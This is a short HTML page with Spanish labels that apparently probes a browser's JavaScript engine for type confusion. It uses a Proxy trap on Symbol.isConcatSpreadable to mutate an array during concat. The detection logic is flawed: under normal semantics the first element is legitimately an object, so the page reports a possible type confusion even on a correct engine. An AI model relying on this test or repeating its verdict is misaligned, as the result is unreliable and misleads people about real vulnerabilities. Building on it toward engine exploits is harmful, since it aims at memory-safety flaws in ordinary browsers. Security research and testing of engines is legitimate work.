  <h1>Test Type Confusion (sin WebAssembly)</h1>
  <div id="status">Ejecutando...</div>
  <script>
    function log(msg) {
      document.getElementById("status").textContent = msg;
      console.log(msg);
    }

    try {
      let victim = [1.1, 2.2, 3.3];
      let container = {obj: victim};
      let handler = {
        get: function(target, prop) {
          if (prop === Symbol.isConcatSpreadable) {
            victim[0] = {};
            return true;
          }
          return target[prop];
        }
      };
      let proxy = new Proxy([], handler);
      let arr = [].concat(proxy, victim);

      if (typeof arr[0] === "object") {
        log("✅ POSIBLE CONFUSIÓN DE TIPO DETECTADA");
      } else {
        log("❌ No se produjo type confusion");
      }
    } catch (e) {
      log("❌ Error en ejecución: " + e);
    }
  </script>
